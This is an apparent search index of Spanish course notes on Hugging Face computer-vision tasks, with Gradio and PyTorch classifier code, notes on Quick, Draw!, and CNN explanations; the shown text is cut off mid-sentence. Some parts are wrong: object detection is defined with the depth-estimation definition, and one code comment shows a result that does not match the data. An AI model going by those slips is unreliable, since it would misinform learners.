#/tmp/gradio/b7be1455904a47b7fb3d953514163c828cc46e093fe7ba8bdeb950039a8e870e/1.png\u200b\n   print(inp) \n   pipe = pipeline(\"image-classification\", model=\"omarques/autotrain-dogs-and-cats-1527055142\")\u200b\n   #[{'label': 'cat', 'score': 0.6151219010353088}, {'label': 'dog', 'score': 0.38487812876701355}]\u200b\n   print(pipe(inp)) \n   return {'cat': 0.3, 'dog': 0.7}\u200b\n\ndemo = gr.Interface(fn=image_classifier, inputs=gr.Image(type=\"filepath\"), outputs='label')\u200b\n\ndemo.launch()\u200b\n</code></pre>"},{"location":"hf/Ejemplo_gradio/#de-lista-a-diccionario-para-el-output-label","title":"De lista a diccionario para el output label","text":"<p>Para convertir la lista <code>[{'label': 'cat', 'score': 0.6151219010353088}, {'label': 'dog', 'score': 0.38487812876701355}]\u200b</code> al formato requerido por el componente de salida Label <code>(dict[str, float])</code> de Gradio, debemos crear un diccionario donde las claves son los valores de <code>label</code> y los valores son los correspondientes a <code>score</code>\u200b</p> <p>Ejemplo sencillo:\u200b <pre><code>lista = [\u200b\n\u2003\u2003{'label': 'cat', 'score': 0.6151219010353088},\u200b\n\u2003 {'label': 'dog', 'score': 0.38487812876701355}\u200b\n]\u200b\nresultado = {d['label']: d['score'] for d in lista}\u200b\u200b\n# Resultado: {'cat': 0.8, 'dog': 0.2}\u200b\nprint(resultado)\u200b\n</code></pre></p>"},{"location":"hf/Ejemplo_gradio/#codigo-final","title":"C\u00f3digo final","text":"<p><pre><code>import gradio as gr\u200b\nfrom transformers import pipeline\u200b\n\u200b\ndef image_classifier(inp):\u200b\n   pipe = pipeline(\"image-classification\", model=\"omarques/autotrain-dogs-and-cats-1527055142\")\u200b\n   #[{'label': 'cat', 'score': 0.6151219010353088}, {'label': 'dog', 'score': 0.38487812876701355}]\u200b\n   etiquetas = pipe(inp)\n   #[{'cat': 0.6151219010353088}, {'dog': 0.38487812876701355}]\u200b\n   resultado = {d['label']: d['score'] for d in etiquetas} \n   return resultado\u200b\n\ndemo = gr.Interface(fn=image_classifier, inputs=gr.Image(type=\"filepath\"), outputs='label')\u200b\n\ndemo.launch()\u200b\n</code></pre> \u200b</p> <p>\u200b</p>"},{"location":"hf/Referencias/","title":"\ud83d\udcce Referencias:","text":"<ul> <li>Tasks de HuggingFace</li> <li>Apuntes de HuggingFace elaborados por Aitor Medrano</li> </ul>"},{"location":"hf/Tasks_texts/","title":"Tasks de Hugging face","text":""},{"location":"hf/Tasks_texts/#objetivos","title":"Objetivos","text":"<ul> <li>Diferenciar qu\u00e9 es un \"task\" en Machine Learning seg\u00fan Hugging Face.</li> <li>Aprender los conceptos y ejemplos de estimaci\u00f3n de profundidad, clasificaci\u00f3n y segmentaci\u00f3n de im\u00e1genes.</li> <li>Probar ejemplos pr\u00e1cticos con pipelines de Hugging Face.</li> </ul> <p>Hugging Face es el portal para todas las tareas de aprendizaje autom\u00e1tico. Aqu\u00ed encontraremos todo lo necesario para empezar con una tarea: demostraciones, casos de uso, modelos, conjuntos de datos y mucho m\u00e1s.</p>"},{"location":"hf/Tasks_texts/#que-es-un-task","title":"\u00bfQu\u00e9 es un task?","text":"<p>Un \"task\" en Hugging Face describe el tipo de problema que un modelo puede resolver. Permite buscar, probar y reutilizar modelos seg\u00fan la tarea (task) deseada.</p> <p> Tasks (tareas) en Hugging Face</p>"},{"location":"hf/Tasks_texts/#uso-de-hugging-face-para-tareas-de-vision-por-computadora","title":"Uso de Hugging Face para tareas de visi\u00f3n por computadora","text":"<p>Hugging Face tambi\u00e9n proporciona una amplia colecci\u00f3n de modelos preentrenados para tareas de visi\u00f3n artificial. Con todos estos modelos alojados previamente entrenados, podemos crear aplicaciones interesantes que detectan objetos en im\u00e1genes, la edad de una persona y m\u00e1s. En este tema, aprenderemos a realizar las primeras cuatro tareas utilizando modelos de Hugging Face. </p>"},{"location":"hf/Tasks_texts/#1-clasificacion-de-imagenes-image-classification","title":"1. Clasificaci\u00f3n de Im\u00e1genes (Image Classification)","text":"<p>La clasificaci\u00f3n de im\u00e1genes es una tarea de visi\u00f3n artificial que implica categorizar o etiquetar una imagen en una o varias clases o categor\u00edas predefinidas. El objetivo de la clasificaci\u00f3n de im\u00e1genes es reconocer y asignar la etiqueta m\u00e1s adecuada a una imagen determinada en funci\u00f3n de su contenido. </p> <p></p>"},{"location":"hf/Tasks_texts/#ejemplos-de-aplicaciones","title":"Ejemplos de aplicaciones:","text":"<ul> <li>Diagn\u00f3stico m\u00e9dico (clasificar radiograf\u00edas)</li> <li>Reconocimiento de objetos</li> <li>Clasificaci\u00f3n de productos en e-commerce</li> <li>Moderaci\u00f3n de contenido visual</li> </ul>"},{"location":"hf/Tasks_texts/#modelos-disponibles-en-hugging-face","title":"Modelos disponibles en Hugging Face","text":"<p>Hugging Face ofrece m\u00faltiples modelos preentrenados para clasificaci\u00f3n de im\u00e1genes. Algunos destacados:</p> Modelo Arquitectura Dataset de entrenamiento Enlace <code>google/vit-base-patch16-224</code> Vision Transformer (ViT) ImageNet \ud83d\udd17 Ver modelo <code>microsoft/resnet-50</code> ResNet-50 ImageNet \ud83d\udd17 Ver modelo <code>facebook/deit-base-patch16-224</code> DeiT ImageNet \ud83d\udd17 Ver modelo"},{"location":"hf/Tasks_texts/#quick-draw-de-google","title":"\"Quick, Draw!\" de Google","text":"<p>Este juego se ha creado con aprendizaje autom\u00e1tico. Cuando dibujas algo, una red neuronal intenta adivinar qu\u00e9 est\u00e1s dibujando. Evidentemente, no siempre funciona; pero cuanto m\u00e1s juegues, m\u00e1s aprender\u00e1. Ya reconoce cientos de conceptos y esperamos poder a\u00f1adir m\u00e1s en el futuro. Nuestro objetivo es mostrar un ejemplo de c\u00f3mo se puede usar el aprendizaje autom\u00e1tico de forma divertida. Mira el siguiente v\u00eddeo para saber c\u00f3mo funciona y</p> <p>Caracter\u00edsticas clave</p> <ul> <li> <p>Juego con IA: El juego es un experimento de aprendizaje autom\u00e1tico. El jugador dibuja y la red neuronal intenta adivinar el dibujo en tiempo real.</p> </li> <li> <p>Aprendizaje continuo: La IA aprende de cada dibujo, mejorando su capacidad para adivinar correctamente en el futuro. Esto ayuda a Google a recopilar uno de los conjuntos de datos de garabatos m\u00e1s grandes del mundo para la investigaci\u00f3n en aprendizaje autom\u00e1tico.</p> </li> <li> <p>Mec\u00e1nica simple: El juego es similar al Pictionary. Consiste en seis rondas, y en cada una se nos pide dibujar un objeto diferente en 20 segundos. Al final, podemos ver nuestros dibujos y los resultados.</p> </li> <li> <p>Accesibilidad: El juego es gratuito y se puede jugar directamente en el navegador web desde cualquier dispositivo (smartphone, tablet, ordenador, etc.). </p> </li> </ul> <p>Podemos acceder al juego en el sitio web oficial: Web oficial. </p> <p>Importancia de los datos - BigData</p> <p>Los datos recopilados en el juego \"Quick, Draw!\" son fundamentales en el \u00e1mbito del Big Data y el aprendizaje autom\u00e1tico porque conforman el conjunto de datos de garabatos m\u00e1s grande del mundo, esencial para entrenar y mejorar los modelos de inteligencia artificial de Google.  Su importancia radica en varios puntos clave:</p> <ul> <li> <p>Entrenamiento de IA: Los millones de dibujos (actualmente m\u00e1s de 50 millones en 345 categor\u00edas) sirven como un vasto corpus de datos para entrenar redes neuronales, ense\u00f1\u00e1ndoles a reconocer e interpretar garabatos de formas muy diversas. La IA aprende a identificar patrones visuales, sin importar el estilo individual del dibujante.</p> </li> <li> <p>Diversidad y variabilidad: A diferencia de conjuntos de datos de im\u00e1genes tradicionales, los garabatos muestran una enorme variabilidad en c\u00f3mo las personas de diferentes culturas y con distintas habilidades dibujan un mismo objeto. Esta diversidad es crucial para crear modelos de IA m\u00e1s robustos y menos sesgados que puedan funcionar globalmente.</p> </li> <li> <p>Datos en tiempo real y secuenciales: Los dibujos se capturan como series temporales de posiciones del l\u00e1piz (vectores con marca de tiempo), no solo como im\u00e1genes est\u00e1ticas. Esto permite a los investigadores comprender no solo el resultado final, sino tambi\u00e9n el proceso de dibujo (qu\u00e9 trazo se hizo primero, en qu\u00e9 direcci\u00f3n), lo cual es valioso para desarrollar modelos de IA m\u00e1s avanzados, como el modelo Sketch-RNN.</p> </li> <li> <p>Investigaci\u00f3n abierta: Google ha hecho p\u00fablico este conjunto de datos para que investigadores de todo el mundo puedan utilizarlo en sus propios proyectos y estudios de aprendizaje autom\u00e1tico, fomentando la innovaci\u00f3n en el campo.</p> </li> <li> <p>Ejemplo de gamificaci\u00f3n para la recolecci\u00f3n de datos: El juego es un excelente ejemplo de c\u00f3mo la gamificaci\u00f3n puede motivar a un gran n\u00famero de usuarios a generar datos valiosos de forma divertida y a gran escala, un desaf\u00edo com\u00fan en el Big Data</p> </li> </ul> <p>Datos de entrenamiento</p> <p></p> <p>En esta p\u00e1gina podemos ver, en el momento en el que se redactaban estos apuntes, 126.372 dibujos de pelotas de baloncesto hechas por personales reales...en Internet. Incluso, podemos ver los trazos que han realizado estas personas hasta que el modelo ha sido capaz de adivinar el dibujo.  Destacar la importancia del Big Data, ya que, los datos de entrenamiento son muy importantes para cualquier modelo de aprendizaje. </p> <p>Datos de entrenamiento para la pelota de baloncesto</p> <p></p>"},{"location":"hf/Tasks_texts/#desarrollo-de-nuestro-propio-pictionary-con-gradio","title":"Desarrollo de nuestro propio Pictionary con Gradio","text":"<p>Vamos a crear una aplicaci\u00f3n web con Gradio que use el modelo creado en una sesi\u00f3n anterior: \u200bomarques/autotrain-dogs-and-cats-1527055142</p> <p>Ejemplo de aplicaci\u00f3n Gradio con una imagen de entrada y un Label como componente de salida: </p> <p>Etiquetado de la imagen de entrada: </p>"},{"location":"hf/Tasks_texts/#2-estimacion-de-profundidad-depth-estimation","title":"2. Estimaci\u00f3n de Profundidad (Depth Estimation)","text":"<ul> <li>Definici\u00f3n: Predice la distancia de cada p\u00edxel respecto a la c\u00e1mara usando solo una imagen.</li> <li>Aplicaciones: Rob\u00f3tica, realidad aumentada, veh\u00edculos aut\u00f3nomos, etc.</li> <li>Modelos populares: DPT, MiDaS</li> </ul> <pre><code># Utiliza el pipeline:\n\nfrom transformers import pipeline\n\ndepth = pipeline(\"depth-estimation\", model=\"Intel/zoedepth-nyu-kitti\")\n\nresult = depth(\"ruta_o_url_imagen\")\n</code></pre>"},{"location":"hf/Tasks_vc/","title":"Tasks de Hugging face relacionadas con la Visi\u00f3n por computador","text":""},{"location":"hf/Tasks_vc/#objetivos","title":"Objetivos","text":"<ul> <li>Diferenciar qu\u00e9 es un \"task\" en Machine Learning seg\u00fan Hugging Face.</li> <li>Aprender los conceptos y ejemplos de estimaci\u00f3n de profundidad, clasificaci\u00f3n y segmentaci\u00f3n de im\u00e1genes.</li> <li>Probar ejemplos pr\u00e1cticos con pipelines de Hugging Face.</li> </ul> <p>Hugging Face es el portal para todas las tareas de aprendizaje autom\u00e1tico. Aqu\u00ed encontraremos todo lo necesario para empezar con una tarea: demostraciones, casos de uso, modelos, conjuntos de datos y mucho m\u00e1s.</p>"},{"location":"hf/Tasks_vc/#que-es-un-task","title":"\u00bfQu\u00e9 es un task?","text":"<p>Un task en Hugging Face define el tipo de problema que un modelo est\u00e1 dise\u00f1ado para resolver. Esta clasificaci\u00f3n facilita la b\u00fasqueda, prueba y reutilizaci\u00f3n de modelos seg\u00fan la tarea espec\u00edfica que se desea abordar. Tasks (tareas) en Hugging Face </p>"},{"location":"hf/Tasks_vc/#uso-de-hugging-face-para-tareas-de-vision-por-computadora","title":"Uso de Hugging Face para tareas de Visi\u00f3n por Computadora","text":"<p>Hugging Face tambi\u00e9n proporciona una amplia colecci\u00f3n de modelos preentrenados para tareas de visi\u00f3n artificial. Con todos estos modelos alojados previamente entrenados, podemos crear aplicaciones interesantes que detectan objetos en im\u00e1genes, la edad de una persona y m\u00e1s. En este tema, aprenderemos a realizar las primeras cuatro tareas utilizando modelos de Hugging Face. </p>"},{"location":"hf/Tasks_vc/#1-clasificacion-de-imagenes-image-classification","title":"1. Clasificaci\u00f3n de Im\u00e1genes (Image Classification)","text":"<p>La clasificaci\u00f3n de im\u00e1genes es una tarea de visi\u00f3n por computador que consiste en asignar una o varias etiquetas predefinidas a una imagen, seg\u00fan su contenido. </p>"},{"location":"hf/Tasks_vc/#ejemplos-de-aplicaciones","title":"Ejemplos de aplicaciones","text":"<ul> <li>Diagn\u00f3stico m\u00e9dico: clasificaci\u00f3n de radiograf\u00edas para detectar enfermedades.</li> <li>Reconocimiento de objetos</li> <li>Clasificaci\u00f3n de productos en e-commerce</li> <li>Moderaci\u00f3n de contenido visual</li> </ul>"},{"location":"hf/Tasks_vc/#modelos-disponibles-en-hugging-face","title":"Modelos disponibles en Hugging Face","text":"<p>Hugging Face ofrece m\u00faltiples modelos preentrenados para clasificaci\u00f3n de im\u00e1genes. Estos modelos han sido entrenados con grandes conjuntos de datos, como ImageNet, lo que les permite reconocer una amplia variedad de objetos y escenas. Algunos destacados:</p> Modelo Arquitectura Dataset de entrenamiento Enlace <code>google/vit-base-patch16-224</code> Vision Transformer (ViT) ImageNet \ud83d\udd17 Ver modelo <code>microsoft/resnet-50</code> ResNet-50 ImageNet \ud83d\udd17 Ver modelo <code>facebook/deit-base-patch16-224</code> DeiT ImageNet \ud83d\udd17 Ver modelo"},{"location":"hf/Tasks_vc/#quick-draw-de-google","title":"\"Quick, Draw!\" de Google","text":"<p>Quick, Draw! es un juego basado en aprendizaje autom\u00e1tico en el que una red neuronal intenta adivinar el objeto que el usuario est\u00e1 dibujando. Evidentemente, no siempre funciona; pero cuanto m\u00e1s tiempo pasemos jugando, m\u00e1s aprender\u00e1. Destacar que ya reconoce cientos de conceptos y esperan poder a\u00f1adir m\u00e1s en el futuro. El gran objetivo de esta aplicaci\u00f3n, es mostrar un ejemplo de c\u00f3mo se puede usar el aprendizaje autom\u00e1tico de forma divertida. </p> <p>Caracter\u00edsticas clave</p> <ul> <li> <p>Juego con IA: El juego es un experimento de aprendizaje autom\u00e1tico. El jugador dibuja y la red neuronal intenta adivinar el dibujo en tiempo real.</p> </li> <li> <p>Aprendizaje continuo: La IA aprende de cada dibujo, mejorando su capacidad para adivinar correctamente en el futuro. Esto ayuda a Google a recopilar uno de los conjuntos de datos de garabatos m\u00e1s grandes del mundo para la investigaci\u00f3n en aprendizaje autom\u00e1tico.</p> </li> <li> <p>Mec\u00e1nica simple: El juego es similar al Pictionary. Consiste en seis rondas, y en cada una se nos pide dibujar un objeto diferente en 20 segundos. Al final, podemos ver nuestros dibujos y los resultados.</p> </li> </ul> <p>Podemos acceder al juego en el sitio web oficial: Web oficial. </p> <p>Importancia de los datos - BigData</p> <p>Los datos recopilados en Quick, Draw! son fundamentales para el Big Data y el aprendizaje autom\u00e1tico, ya que constituyen el conjunto de datos de garabatos m\u00e1s grande del mundo, esencial para entrenar y mejorar modelos de IA.  Su importancia radica en varios puntos clave:</p> <ul> <li> <p>Entrenamiento de IA: Los millones de dibujos (actualmente m\u00e1s de 50 millones en 345 categor\u00edas) sirven como un vasto corpus de datos para entrenar redes neuronales, ense\u00f1\u00e1ndoles a reconocer e interpretar garabatos de formas muy diversas. La IA aprende a identificar patrones visuales, sin importar el estilo individual del dibujante.</p> </li> <li> <p>Diversidad y variabilidad: A diferencia de conjuntos de datos de im\u00e1genes tradicionales, los garabatos muestran una enorme variabilidad en c\u00f3mo las personas de diferentes culturas y con distintas habilidades dibujan un mismo objeto. Esta diversidad es crucial para crear modelos de IA m\u00e1s robustos y menos sesgados que puedan funcionar globalmente.</p> </li> <li> <p>Datos en tiempo real y secuenciales: Los dibujos se capturan como series temporales de posiciones del l\u00e1piz (vectores con marca de tiempo), no solo como im\u00e1genes est\u00e1ticas. Esto permite a los investigadores comprender no solo el resultado final, sino tambi\u00e9n el proceso de dibujo (qu\u00e9 trazo se hizo primero, en qu\u00e9 direcci\u00f3n), lo cual es valioso para desarrollar modelos de IA m\u00e1s avanzados, como el modelo Sketch-RNN (Recurrent Neural Network para Bocetos es un modelo generativo de aprendizaje autom\u00e1tico desarrollado por David Ha y Douglas Eck en Google Brain, que es capaz de crear, completar y manipular bocetos vectoriales de objetos comunes)</p> </li> <li> <p>Investigaci\u00f3n abierta: Google ha hecho p\u00fablico este conjunto de datos para que investigadores de todo el mundo puedan utilizarlo en sus propios proyectos y estudios de aprendizaje autom\u00e1tico, fomentando la innovaci\u00f3n en el campo.</p> </li> <li> <p>Ejemplo de gamificaci\u00f3n para la recolecci\u00f3n de datos: El juego es un excelente ejemplo de c\u00f3mo la gamificaci\u00f3n puede motivar a un gran n\u00famero de usuarios a generar datos valiosos de forma divertida y a gran escala, un desaf\u00edo com\u00fan en el Big Data.</p> </li> </ul> <p>Datos de entrenamiento</p> <p></p> <p>En esta p\u00e1gina podemos ver, en el momento en el que se redactaban estos apuntes, 126.372 dibujos de pelotas de baloncesto hechas por personales reales...en Internet. Incluso, podemos ver los trazos que han realizado estas personas hasta que el modelo ha sido capaz de adivinar el dibujo.  Destacar la importancia del Big Data, ya que, los datos de entrenamiento son muy importantes para cualquier modelo de aprendizaje. </p> <p>Datos de entrenamiento para la pelota de baloncesto</p> <p></p>"},{"location":"hf/Tasks_vc/#desarrollo-de-nuestro-propio-pictionary-con-gradio","title":"Desarrollo de nuestro propio Pictionary con Gradio","text":"<p>Vamos a desarrollar nuestra propia aplicaci\u00f3n Pictionary utilizando Gradio, basada en el siguiente v\u00eddeo: https://www.youtube.com/watch?v=LS9Y2wDVI0k</p> <p>Todos los ficheros se encuentran en el siguiente espacio de Hugging Face: https://huggingface.co/spaces/nateraw/quickdraw</p> <p>Lo primero que debemos es, descargar los ficheros siguientes: <code>class_names.txt</code>, <code>pytorch_model.bin</code> y <code>app.py</code></p> <p>Analizamos el c\u00f3digo elaborado por el usuario:</p> <pre><code>from pathlib import Path  \nimport torch             \n\nimport gradio as gr       \nfrom torch import nn      \n\n# Lee las etiquetas/clases del archivo de texto, una por l\u00ednea. \n# Cada l\u00ednea es una categor\u00eda que el modelo puede predecir.\nLABELS = Path('class_names.txt').read_text().splitlines()\n\n# Definimos la arquitectura de la red neuronal convolucional (CNN) ya entrenada:\nmodel = nn.Sequential(\n    # Primera capa: 1 canal de entrada, 32 filtros, tama\u00f1o de filtro 3x3\n    nn.Conv2d(1, 32, 3, padding='same'),  \n    # Funci\u00f3n de activaci\u00f3n no lineal ReLU (acelera y facilita el aprendizaje)\n    nn.ReLU(),                            \n    # Max Pooling: reduce la resoluci\u00f3n espacial de las caracter\u00edsticas\n    #  (comprime la imagen a la vez que mantiene zonas m\u00e1s \u201cactivas\u201d)\n    nn.MaxPool2d(2),                      \n    nn.Conv2d(32, 64, 3, padding='same'), # Segunda capa: 32\u219264 filtros\n    nn.ReLU(),\n    nn.MaxPool2d(2),\n    nn.Conv2d(64, 128, 3, padding='same'),# Tercera capa: 64\u2192128 filtros\n    nn.ReLU(),\n    nn.MaxPool2d(2),\n    # Aplana los datos resultantes para prepararlos para las capas densas \n    # (total elementos = 128 canales * 3 * 3)\n    nn.Flatten(),                         \n    # Capa totalmente conectada: de 1152 (productos anteriores) a 256 neuronas\n    nn.Linear(1152, 256),                 \n    nn.ReLU(),\n    # Capa de salida: 1 neurona por clase del archivo de etiquetas\n    nn.Linear(256, len(LABELS)),          \n)\n# Carga los pesos entrenados previamente desde \n# el archivo binario (estado del modelo)\nstate_dict = torch.load('pytorch_model.bin', map_location='cpu')\nmodel.load_state_dict(state_dict, strict=False)\n# Coloca el modelo en modo \"solo inferencia\" \n# (no entrenamiento): no calcula gradientes ni actualiza pesos\nmodel.eval() \n\n# Funci\u00f3n de predicci\u00f3n principal: toma una imagen (array) \n# y devuelve las top-5 categor\u00edas con su probabilidad\ndef predict(im):\n    # Convierte el array de la imagen en un tensor, escala los valores a rango [0,1] \n    # y a\u00f1ade dimensiones de batch y canal\n    x = torch.tensor(im, dtype=torch.float32).unsqueeze(0).unsqueeze(0) / 255.\n\n    # Desactiva el c\u00e1lculo de gradientes (m\u00e1s r\u00e1pido, no entrena)\n    with torch.no_grad():            \n        # Hacemos pasar la imagen por el modelo (forward pass)\n        out = model(x)               \n\n    # Calcula las probabilidades (softmax)\n    probabilities = torch.nn.functional.softmax(out[0], dim=0)  \n\n    # Obtiene las 5 clases m\u00e1s probables\n    values, indices = torch.topk(probabilities, 5)              \n\n    # Devuelve un diccionario {clase: probabilidad} para las 5 mejores\n    return {LABELS[i]: v.item() for i, v in zip(indices, values)}\n\n# Creamos la interfaz web con Gradio:\n#   - predict: funci\u00f3n a ejecutar al recibir la entrada.\n#   - inputs: 'sketchpad', una zona para que el usuario dibuje a mano alzada.\n#   - outputs: 'label', salida tipo clasificaci\u00f3n de etiquetas.\n#   - live=True: muestra predicciones en tiempo real mientras dibujas.\ninterface = gr.Interface(predict, inputs='sketchpad', outputs='label', live=True)\n\ninterface.launch(debug=True)\n</code></pre>"},{"location":"hf/Tasks_vc/#que-es-una-red-neuronal-convolucional-cnn","title":"\u00bfQu\u00e9 es una red neuronal convolucional (CNN)?","text":"<p>Una red neuronal convolucional (CNN, por sus siglas en ingl\u00e9s, Convolutional Neural Network) es un tipo de red neuronal artificial especialmente dise\u00f1ada para procesar datos que tienen una estructura en forma de cuadr\u00edcula, como im\u00e1genes, audio o v\u00eddeo.</p>"},{"location":"hf/Tasks_vc/#caracteristicas-principales","title":"Caracter\u00edsticas principales","text":"<ul> <li> <p>Inspiraci\u00f3n biol\u00f3gica:: Las CNNs se inspiran en la corteza visual de los mam\u00edferos. Primero detectan reglas simples (l\u00edneas, bordes) y despu\u00e9s patrones m\u00e1s complejos (formas, objetos).</p> </li> <li> <p>Arquitectura en capas:   Una CNN est\u00e1 compuesta por diferentes capas conectadas:</p> <ul> <li>Capas convolucionales: Aplican filtros o \u201ckernels\u201d para extraer patrones y caracter\u00edsticas locales (bordes, texturas, esquinas).</li> <li>Capas de activaci\u00f3n (ReLU): Introducen no linealidad, permitiendo que la red aprenda funciones m\u00e1s complejas.</li> <li>Capas de agrupamiento (pooling): Reducen la resoluci\u00f3n espacial y la cantidad de computaci\u00f3n, logrando robustez ante desplazamientos.</li> <li>Capas totalmente conectadas: Integran toda la informaci\u00f3n para tomar decisiones y realizar la predicci\u00f3n final.</li> </ul> </li> <li> <p>Aprendizaje jer\u00e1rquico:   Las CNNs aprenden jerarqu\u00edas de caracter\u00edsticas: Las primeras capas detectan elementos simples, las siguientes combinan estos elementos y las \u00faltimas reconocen patrones complejos y abstractos.</p> </li> <li> <p>Campos receptivos y par\u00e1metros compartidos: Los filtros se aplican en toda la imagen usando los mismos par\u00e1metros, lo que permite detectar el mismo patr\u00f3n en distintas posiciones. As\u00ed, el n\u00famero de par\u00e1metros y el coste de memoria disminuyen en comparaci\u00f3n con una red completamente conectada.</p> </li> </ul>"},{"location":"hf/Tasks_vc/#aplicaciones-tipicas","title":"Aplicaciones t\u00edpicas","text":"<ul> <li>Reconocimiento y clasificaci\u00f3n de im\u00e1genes: Detecci\u00f3n de objetos, diagn\u00f3stico m\u00e9dico, moderaci\u00f3n de contenido, etc.</li> <li>Visi\u00f3n por computador: Conducci\u00f3n aut\u00f3noma, videovigilancia, an\u00e1lisis de tr\u00e1fico.</li> <li>Procesamiento de v\u00eddeo: Reconocimiento de acciones, seguimiento de objetos en secuencias de im\u00e1genes, an\u00e1lisis deportivo.</li> </ul>"},{"location":"hf/Tasks_vc/#ejemplo-didactico-sencillo","title":"Ejemplo did\u00e1ctico sencillo","text":"<p>Cuando pasas una imagen por una CNN:</p> <ul> <li>Las primeras capas detectan bordes y formas sencillas.</li> <li>Las siguientes detectan partes m\u00e1s grandes (ruedas, patas, ojos).</li> <li>Al final, la red puede identificar el objeto completo (ej. \u201cbicicleta\u201d, \u201cgato\u201d, \u201cpersona\u201d) en la imagen.</li> </ul> <p>Como hemos comprobado en el ejemplo, el c\u00f3digo desarrollado por el usuario no funciona actualmente, por lo que debemos realizar algunas mejoras para que el c\u00f3digo original funcione. A continuaci\u00f3n podemos visualizar la soluci\u00f3n final:</p> <pre><code>from pathlib import Path\nfrom PIL import Image\nfrom torch import nn\n\nimport torch\nimport gradio as gr\nimport numpy as np\n\n# Leemos las etiquetas de clases (categor\u00edas) desde un fichero de texto\nLABELS = Path('class_names.txt').read_text().splitlines()\n\n# Definimos la arquitectura de la red neuronal convolucional (CNN) ya entrenada:\nmodel = nn.Sequential(\n    # Primera capa: 1 canal de entrada, 32 filtros, tama\u00f1o de filtro 3x3\n    nn.Conv2d(1, 32, 3, padding='same'),  \n    # Funci\u00f3n de activaci\u00f3n no lineal ReLU (acelera y facilita el aprendizaje)\n    nn.ReLU(),                            \n    # Max Pooling: reduce la resoluci\u00f3n espacial de las caracter\u00edsticas \n    # (comprime la imagen a la vez que mantiene zonas m\u00e1s \u201cactivas\u201d)\n    nn.MaxPool2d(2),                      \n    nn.Conv2d(32, 64, 3, padding='same'), # Segunda capa: 32\u219264 filtros\n    nn.ReLU(),\n    nn.MaxPool2d(2),\n    nn.Conv2d(64, 128, 3, padding='same'),# Tercera capa: 64\u2192128 filtros\n    nn.ReLU(),\n    nn.MaxPool2d(2),\n    # Aplana los datos resultantes para prepararlos para las capas\n    # densas (total elementos = 128 canales * 3 * 3)\n    nn.Flatten(),                         \n    # Capa totalmente conectada: de 1152 (productos anteriores) \n    # a 256 neuronas\n    nn.Linear(1152, 256),                 \n    nn.ReLU(),\n    # Capa de salida: 1 neurona por clase del archivo de etiquetas\n    nn.Linear(256, len(LABELS)),          \n)\n# Cargamos los pesos previamente entrenados del modelo\nstate_dict = torch.load('pytorch_model.bin', map_location='cpu')\nmodel.load_state_dict(state_dict, strict=False)\n# Ponemos el modelo en modo inferencia (no entrenamiento)\nmodel.eval()  \n\n# Funci\u00f3n principal de predicci\u00f3n, procesar\u00e1 el dibujo \n# de Gradio y calcular\u00e1 su clase\ndef predict(img):   \n    # Si no hay dibujo o la clave 'composite' no existe o est\u00e1 vac\u00eda, avisamos:\n    if img is None or \"composite\" not in img or img[\"composite\"] is None:\n        return {\"Por favor, dibuja algo\": 1.0}\n    # Extraemos la imagen resultado del canvas, canal RGBA\n    # Array con forma (ej. [800, 800, 4]), tipo uint8\n    arr = img[\"composite\"]        \n    # Convertimos de RGBA a escala de grises (Quick Draw es gris)\n    arr_gray = arr[..., :3].mean(axis=2)\n    # Convertimos a uint8 por si PIL lo necesita\n    arr_gray_uint8 = arr_gray.astype(\"uint8\")\n    # Redimensionamos a 28x28 p\u00edxeles (tama\u00f1o de entrada del modelo)\n    arr_img = Image.fromarray(arr_gray_uint8)\n    arr_resized = np.array(arr_img.resize((28, 28), resample=Image.BILINEAR))\n    # Escalamos a rango [0,1]\n    arr_normalized = arr_resized / 255.0\n    # A\u00f1adimos dimensiones de batch y canal: (1, 1, 28, 28)\n    x = torch.tensor(arr_normalized, dtype=torch.float32).unsqueeze(0).unsqueeze(0)\n    # Ejecutamos inferencia sin calcular gradientes (m\u00e1s eficiente)\n    with torch.no_grad():\n        out = model(x)\n    # Calculamos probabilidades con softmax\n    probabilities = torch.nn.functional.softmax(out[0], dim=0)\n    # Obtenemos las 5 clases m\u00e1s probables (top-5)\n    values, indices = torch.topk(probabilities, 5)\n    # Devolvemos un diccionario: categor\u00eda : probabilidad (~confianza)\n    return {LABELS[i]: v.item() for i, v in zip(indices, values)}\n\n# Creamos la interfaz Gradio:\n# - El input es un sketchpad (zona para dibujar)\n# - El output son etiquetas: las categor\u00edas predecidas\n# - live=True: actualiza la predicci\u00f3n en tiempo real al dibujar\ndemo = gr.Interface(\n    predict,     \n    inputs='sketchpad',\n    outputs='label', \n    live=True)\n\ndemo.launch(share=True)\n</code></pre> <p>La funci\u00f3n softmax de torch (PyTorch) es una operaci\u00f3n matem\u00e1tica que transforma un vector de valores reales \u2014normalmente llamados \"logits\"\u2014 en una distribuci\u00f3n de probabilidades sobre diferentes clases, donde todos los elementos resultantes est\u00e1n entre 0 y 1 y la suma es exactamente 1. Por ejemplo, si tu modelo clasifica im\u00e1genes en tres clases, la salida softmax ser\u00e1 un vector con tres valores que representan la probabilidad atribuida a cada clase.\u200b</p> <p>En PyTorch, podemos usar esta funci\u00f3n tanto como capa de activaci\u00f3n en la salida de nuestro modelo, como directamente llamando torch.nn.functional.softmax() sobre un tensor de logits. Es com\u00fan utilizar softmax en la inferencia para obtener probabilidades interpretables, mientras que durante el entrenamiento suele usarse CrossEntropyLoss, que incorpora la softmax de forma interna y m\u00e1s eficiente.\u200b</p> <p>Aplicaciones comunes:</p> <ul> <li>Clasificaci\u00f3n multiclase: transforma las salidas del modelo en probabilidades para cada categor\u00eda.\u200b</li> <li>Visualizaci\u00f3n de la confianza del modelo en cada posible resultado. En resumen, softmax convierte los resultados num\u00e9ricos en probabilidades \u00fatiles para tomar decisiones y analizar resultados en Deep learning.</li> </ul>"},{"location":"hf/Tasks_vc/#actividad-1-usar-un-space-de-hugging-face","title":"\ud83d\udcdd Actividad 1. Usar un Space de Hugging Face","text":"<p>Bas\u00e1ndote en lo aprendido a partir de los casos de uso de Hola Spaces y Hola Spaces 2.0 trabajadas en una sesi\u00f3n anterior, mediante Gradio en Hugging Face crea un nuevo espacio p\u00fablico en tu cuenta que permita probar la aplicaci\u00f3n del pictionary desarrollada de forma local en un Space de Hugging Face. </p> <p>Entrega la url del espacio y algunas capturas de pantalla usando la aplicaci\u00f3n. </p>"},{"location":"hf/Tasks_vc/#2-deteccion-de-objetos","title":"2. Detecci\u00f3n de objetos","text":"<p>La detecci\u00f3n de objetos predice la distancia de cada p\u00edxel respecto a la c\u00e1mara usando solo una imagen. Es una t\u00e9cnica fundamental en visi\u00f3n computacional que permite identificar y localizar instancias de objetos definidos dentro de im\u00e1genes. Es ampliamente utilizada en aplicaciones como conducci\u00f3n aut\u00f3noma, seguimiento de objetos en 